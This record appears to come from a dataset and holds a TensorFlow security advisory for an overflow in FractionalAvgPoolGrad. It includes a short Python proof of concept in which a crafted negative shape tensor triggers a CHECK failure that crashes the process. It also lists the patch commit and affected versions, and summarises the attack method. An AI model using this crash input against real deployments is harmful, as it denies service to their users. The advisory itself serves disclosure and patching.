{"description": "### Impact\nThe implementation of `FractionalAvgPoolGrad` does not fully validate the input `orig_input_tensor_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\noverlapping = True\norig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)\nout_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)\nrow_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)\ntf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [03a659d7be9a1154fdf5eeac221e5950fec07dad](https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n", "methods": ["Trigger a denial of service attack by exploiting a CHECK failure in TensorFlow's FractionalAvgPoolGrad implementation.", "Overflow vulnerability in TensorFlow's FractionalAvgPoolGrad implementation."]}
